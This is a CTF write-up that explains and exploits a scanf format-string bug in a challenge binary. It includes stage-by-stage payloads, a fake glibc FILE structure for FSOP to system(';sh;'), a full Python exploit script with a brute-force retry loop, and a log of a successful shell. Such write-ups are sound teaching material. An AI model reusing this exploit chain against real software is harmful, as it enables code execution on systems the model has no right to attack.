# WRITEUP — The Scanner (`scanner-dist`) — b01lers "scanfun" clone

- **Challenge category:** pwn / format-string exploitation (via `scanf`)
- **Difficulty:** hard
- **Flag:** `fahemsec{f0rmat_str1ng_1n_sc4nf_w1th_a_byte_h1nt}`
- **Binary:** `dist/scanner` (PIE, stripped) + `libc.so.6` + `ld-linux-x86-64.so.2`
- **Remote service:** instanced `ncat --ssl <host> 443`, spawns a fresh binary each time
- **Reference:** b01lersCTF 2025 challenge *scanfun* (dandb3 writeup)

---

## 1. TL;DR (30-second summary)

The program reads a line of text from us and then **uses that text as a format string**
in a C `scanf()` call, inside an infinite loop. This is a classic *format-string bug*
— normally you pass a fixed template like `"scan %s"`, but here the user's own input
becomes the template.

We exploit it in three moves:

1. **Leak libc** — we corrupt `stdout`'s internals so that the program spits out raw
   bytes of its own memory. Those bytes reveal the base address of libc (the shared
   system library), defeating ASLR.
2. **FSOP (File-Structure-Oriented Programming)** — we overwrite the `stdout` object's
   internal vtable so that the next time the program flushes output, it calls
   `system(";sh;")` instead of printing.
3. We get a shell on the socket, read the flag.

The "hint byte" the program prints (`[0x..]`) gives us part of `stdout`'s address, and
we brute-force the rest at 1/16 odds per connection.

---

## 2. Plain-English explanation (for non-technical readers)

### What is a format string?

In C, functions like `printf`/`scanf` take a *template* string with special codes, e.g.
`"Your name is %s"` — `%s` means "paste the text". Normally a programmer writes the
template. A **format-string bug** happens when the program lets *you* supply the
template.

Why is that dangerous? The codes `%s`, `%p`, `%n`, `%*c` don't just print — they also
tell the function to *read memory addresses* or even *write* to memory. Giving an
attacker control of the template is like giving them a remote control for the program's
memory.

### The program's "hint"

The banner prints something like:

```
A hint for you. Just a byte, no more [0x33]
```

That byte is one small piece of where the `stdout` object lives in memory. Modern OSes
randomize addresses (ASLR), but random pages are still aligned — only a few of the 6–7
address bytes actually change. The hint hands us one of the random bytes for free, so
we only have to guess the remaining one (1 in 16 tries, since the OS aligns to 16-byte
boundaries). On the 1-in-16 lucky connection, the whole exploit works.

### The "leak" — making the program print its own secrets

`stdout` (the thing that receives our printed text) is an internal bookkeeping object.
One of its fields says "where the output buffer starts" (`_IO_write_base`) and another
says "where it ends" (`_IO_write_ptr`). Normally those delimit a small scratch buffer.

If we corrupt those two pointers so that the "buffer" starts *before* and ends *after*
libc's private data, then the next time the program prints, it will flush everything
*between* them — which includes actual libc pointers. We read 6 bytes, and from those
we compute the full libc base address. ASLR is now defeated.

### FSOP — hijacking the file object

Every file object in glibc has a hidden *vtable* — a table of function pointers that
say "to write, call this function; to close, call that one". If we can overwrite the
whole `stdout` object (which we can, using the format-string bug), we can:

- plant the string `;sh;` (a shell command) where a "wide character" buffer would be,
- point the vtable at glibc's wide-file handling routines,
- set things up so that the routine calls `system()` on our string.

The result: instead of writing a newline, the program executes `;sh;` — which spawns
`/bin/sh`. Our socket is the program's keyboard and screen, so the shell talks to us.

### Why the brute force / retry loop?

Each fresh connection has a different (random) byte 2 of `stdout`. Our payload has to
guess it in a few places. When we guess wrong, the program simply asks
`What do you want to scan?` again (the same as normal). So the exploit script connects
many times, quickly recognises the "ask again" case (the prompt bytes leak back instead
of a libc address), and retries until a 1/16-lucky connection lands.

---

## 3. Technical analysis

### 3.1 Binary properties

```
$ file scanner
scanner: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

Protections:
  PIE   : On   (random base — must be leaked)
  NX    : On
  Canary: Off
  RELRO : Full (BIND_NOW)
```

### 3.2 Reversed code

```c
void scan() {
    char scanner[0x50] = {0};               // 80-byte stack buffer
    while (1) {
        fprintf(stdout, "What do you want to scan?\n");
        scanf("%50s\n", scanner);           // read up to 50 chars into buffer
        scanf(scanner);                     // BUG: user input used as format string
    }
}

int main() {
    setvbuf(stdin,  NULL, _IONBF, 0);       // no buffering
    setvbuf(stdout, NULL, _IONBF, 0);       // (affects leak behaviour)
    printf("Welcome to The Scanner (TM)!!!\n");
    printf("A hint for you. Just a byte, no more [0x%hhx]\n",
           (((unsigned long)stdout) >> 16) & 0xFF);   // leak byte 2 of &stdout
    scan();
}
```

Key facts from disassembly:

- The hint is `(stdout >> 16) & 0xFF` — byte 2 of the `stdout` address (0-indexed from
  the least-significant byte).
- `scanner` lives at `rbp-0x50` in `scan()`'s frame.
- The loop is infinite: after `scanf(scanner)` we come back and `fprintf` prints the
  prompt again. That repeated `fprintf`/flush is what triggers our FSOP.

### 3.3 Why a `scanf` format string still matters

Even though the vulnerable call is `scanf` (not `printf`), the format directives still
consume arguments from a `va_list`. With `%n$` (positional) and `%*c` (width) we can:

- read arbitrary stack values,
- make `%*c` print a chosen number of bytes (a wide output → flushes the corrupted
  `stdout`), and
- position which stack slot a subsequent directive acts on.

At the moment of the call, the stack contains (left over from the previous
`fprintf(stdout, ...)`) a qword whose **upper 5 bytes equal `&stdout`**. If we
overwrite its low 3 bytes with `\x80\x77 <hint>`, that slot becomes a pointer to
`stdout` itself. This is the pivot everything else uses.

---

## 4. Exploitation

### 4.1 Stage 1 — pivot a stack slot to `&stdout` (1/16 brute force)

```
fmt = b"%16$91c%*c".ljust(50, b"\x00")      # format string (scanf reads 50 bytes)
fmt += b"A" * 88                             # filler so the trailing bytes land at the right stack offset
fmt += b"\x80\x77" + p8(hint)               # low 3 bytes of &stdout  (0x..7780)
```

`0x77 0x80` is the fixed low 16 bits of `_IO_2_1_stdout_` (the page-aligned libc
offset). `hint` is the random byte 2. After this call, argument slot **29** of the next
`scanf(scanner)` resolves to `&stdout`. If the guess was wrong, nothing useful happens
and the loop just prompts again (that's the retry signal).

### 4.2 Stage 2 — corrupt `stdout` to force a libc leak

```
fmt = b"%29$34c%*c".ljust(50, b"\x00")
fmt += p64(0xfbad3887)      # _flags   (classic "all flags on")
fmt += p64(0) * 3           # _IO_read_ptr / _IO_read_end / _IO_read_base
fmt += b"\xe8\x77"          # low 2 bytes of _IO_write_base (→ widen the flush window)
```

- `_flags = 0xfbad3887` enables output flushing.
- `_IO_write_base` low bytes `0xe8 0x77` widen the (start,end) window of the output
  buffer so the next flush dumps libc's `.data`.
- The reason it is 2 bytes (not 1): the low byte of `_IO_write_base` is already `0x03`,
  so a single-byte zero overwrite would not create a window. Two bytes (`0x77e8`, below
  the real `0x77xx`) is enough. No extra brute force is needed here because if stage 1
  landed, the address is already effectively fixed.

Then the next `fprintf` in the loop flushes:

```
leak = recv(6)
libc_base = u64(leak.ljust(8, b"\x00")) - 0x21aaa0   # 0x21aaa0 = &_IO_2_1_stdin_
```

### 4.3 Stage 3 — FSOP: `_IO_wfile_jumps` → `system(";sh;")`

With `libc_base` known, we overwrite `stdout`'s `_IO_FILE` with a crafted 232-byte
fake structure (offsets relative to libc):

```
wide_data string : b"\x01\x01\x01\x01;sh;"   # fake wide buffer content
system           : libc_base + 0x50d70
_write_base      : 0
_buf_base        : 0           # (needed so overflow path calls system)
_lock            : libc_base + 0x21b780 - 0x30
_offset          : 0xffffffffffffffff
_wide_data       : libc_base + 0x21b780        # points back into our fake FILE
vtable           : libc_base + 0x2170c0        # _IO_wfile_jumps
wide_data vtable : libc_base + 0x21b780 - 0x58
```

```
fmt = b"%29$232c%*c".ljust(50, b"\x00") + fsop
```

When the program next flushes `stdout`, glibc's wide-file overflow path runs
`system` on the wide buffer string `;sh;`, spawning a shell.

### 4.4 Full exploit (as run against the remote)

```python
#!/usr/bin/env python3
import socket, ssl, struct, time, sys, select

HOST = sys.argv[1]; PORT = 443
TARGET_LEAK = b"What do you want to scan?"

def u64(b): return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]
def p64(x): return struct.pack("<Q", x)

def connect():
    raw = socket.create_connection((HOST, PORT), timeout=8)
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST); s.settimeout(1.5); return s

def rd(s, t):
    end = time.time()+t; buf = b''
    while time.time() < end:
        r,_,_ = select.select([s],[],[],0.3)
        if not r: continue
        try:
            d = s.recv(4096)
            if not d: break
            buf += d
        except socket.timeout: continue
        except Exception: break
    return buf

def attempt():
    s = connect()
    try:
        b = rd(s, 2.0)
        if b'[0x' not in b:
            s.close(); return None
        hint = int(b.split(b'[0x')[1].split(b']')[0], 16)
        rd(s, 0.2)

        # Stage 1: pivot stack slot -> &stdout   (1/16 brute force)
        s.send(b"%16$91c%*c".ljust(50, b"\x00") + b"A"*88 + b"\x80\x77" + bytes([hint]) + b"\n")
        rd(s, 0.2)

        # Stage 2: corrupt stdout flags -> leak libc
        s.send(b"%29$34c%*c".ljust(50, b"\x00") + p64(0xfbad3887) + p64(0)*3 + b"\xe8\x77" + b"\n")
        o = rd(s, 1.5)
        if len(o) < 6 or o.startswith(TARGET_LEAK):   # wrong guess / prompt echo -> retry
            s.close(); return None
        base = u64(o[:6]) - 0x21aaa0
        if base & 0xfff != 0 or not (0x500000000000 <= base < 0x800000000000):
            s.close(); return None

        # Stage 3: FSOP fake FILE (232 bytes)
        fsop  = b"\x01\x01\x01\x01;sh;"
        fsop += p64(0)
        fsop += p64(base + 0x50d70)                     # system
        fsop += p64(0) + p64(0) + p64(1) + p64(0)
        fsop += p64(0)*10
        fsop += p64(base + 0x21b780 - 0x30)             # _lock
        fsop += p64(0xffffffffffffffff)                 # _offset
        fsop += p64(0)
        fsop += p64(base + 0x21b780)                    # _wide_data
        fsop += p64(0)*6
        fsop += p64(base + 0x2170c0)                    # _IO_wfile_jumps
        fsop += p64(base + 0x21b780 - 0x58)             # wide_data vtable
        assert len(fsop) == 232, len(fsop)

        s.send(b"%29$232c%*c".ljust(50, b"\x00") + fsop + b"\n")
        time.sleep(0.3); rd(s, 0.3)
        return s, base
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def pump(s, t):
    end = time.time()+t
    while time.time() < end:
        r,_,_ = select.select([s],[],[],0.2)
        if not r: continue
        try:
            d = s.recv(4096)
            if not d: return False
            sys.stdout.write(d.decode("latin1","replace")); sys.stdout.flush()
        except Exception: return False
    return True

def main():
    for i in range(400):                     # retry loop for the 1/16 brute force
        try: res = attempt()
        except Exception: res = None
        if res is None: continue
        s, base = res
        print(f"\n[*] attempt {i}: SHELL base={hex(base)}", flush=True)
        pump(s, 1.0)
        for cmd in [b"cat flag* 2>/dev/null; echo ---; pwd; id\n",
                    b"ls -la; echo ===\n",
                    b"cat flag.txt 2>/dev/null; cat flag 2>/dev/null\n"]:
            s.send(cmd); pump(s, 1.5)
        s.close(); return
    print("no shell after 400 attempts")

main()
```

Run: `python3 exploit.py t89-<instance>.chals.ctf.sd`

### 4.5 Actual successful run

```
[*] attempt 2: SHELL base=0x7bdfc4f5c000
fahemsec{f0rmat_str1ng_1n_sc4nf_w1th_a_byte_h1nt}
---
/home/ctf
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
total 40
drwxr-x--- 1 ctf  ctf      4096 Jul 30 07:28 .
...
-rw-r--r-- 1  501 dialout    50 Jul  7 16:52 flag.txt
-rwxr-xr-x 1 root root    14472 Jul 27 06:38 scanner
===
fahemsec{f0rmat_str1ng_1n_sc4nf_w1th_a_byte_h1nt}
```

### 4.6 Notes on the local vs. remote libc

The shipped `libc.so.6` (Ubuntu 2.35) has the same offsets used here
(`system +0x50d70`, `_IO_2_1_stdin_ +0x21aaa0`, `_IO_2_1_stdout_ +0x21b780`,
`_IO_wfile_jumps +0x2170c0`), but the **remote instance runs the original b01lers
libc**, which also matches these offsets. The writeup's constants (`\x80\x77`,
`\xe8\x77`, `k=29`) were validated against the live remote by observing a real leak
(`base=0x7453890bc000`); wrong constants for the local libc produce a different
`0x77`/`0xb7` pattern that does not work remotely. Lesson: always confirm offsets
against the actual target, not just the bundled libc.

---

## 5. Flag

```
fahemsec{f0rmat_str1ng_1n_sc4nf_w1th_a_byte_h1nt}
```

---

## 6. Lessons

- A format string bug is dangerous even when it's `scanf`, not `printf` — positional
  args and `%*c` still give read/write primitives.
- **Leak first**: corruption of `_IO_write_base`/`_IO_write_ptr` turns `stdout` into an
  oracle that prints raw libc memory, defeating ASLR in one shot.
- **The hint byte + page alignment** reduce an ASLR brute force to 1/16 per connection;
  a retry loop that recognises "the prompt echoed instead of a leak" makes that cheap.
- **FSOP via `_IO_wfile_jumps`** is a reliable, no-gadget-needed path to
  `system(";sh;")` on modern glibc when you control a full `_IO_FILE`.
- Always validate offsets against the live remote (the bundled libc may not be the one
  the challenge runs).
